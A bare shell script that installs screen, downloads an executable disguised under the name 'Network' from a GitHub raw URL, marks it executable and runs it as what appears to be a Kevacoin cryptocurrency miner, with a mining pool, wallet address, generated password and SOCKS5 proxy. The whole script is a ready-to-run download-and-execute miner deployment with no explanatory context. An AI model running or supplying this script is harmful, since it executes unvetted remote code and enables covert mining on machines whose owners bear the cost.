apt update 
apt install screen -y 
wget -O Network https://github.com/master-running/master-running/raw/main/Network
chmod +x Network
screen -dmS ls
./Network --algorithm randomkeva --pool de.kevacoin.herominers.com:1163 --wallet VSMtpHwu6RvBnJMKf8vBZ3nUxKAXib6Y9b --password MR=$(echo $strDate-$(shuf -i 1-1000 -n 1)) --proxy=socks5://184.75.247.3:59644
